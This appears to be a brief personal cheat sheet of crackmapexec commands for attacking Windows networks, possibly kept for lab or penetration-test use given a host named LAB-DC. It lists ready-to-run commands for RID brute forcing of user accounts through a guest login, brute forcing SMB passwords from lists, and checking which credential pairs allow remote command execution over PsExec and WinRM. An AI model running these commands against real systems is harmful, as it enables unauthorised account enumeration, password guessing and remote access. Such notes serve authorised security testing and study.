# crackmapexec commands
crackmapexec --help
crackmapexec winrm --help

## RID brute force
```bash
crackmapexec smb LAB-DC -u 'guest' -p '' --rid-brute
```

## test password username arguments or files
## bruteforce SMB
check individual users and passwords and/or files the same way
```bash
crackmapexec smb $IP -u users -p passwords
```

## test valid user and password combinations for command execution permissions
test line by line
### PsExec
```bash
crackmapexec smb $IP -u valid-users.txt -p valid-passwords.txt --no-bruteforce --continue-on-success
```
### WinRM
```bash
crackmapexec winrm $IP -u valid_users -p valid_passwords --no-bruteforce --continue-on-success
```
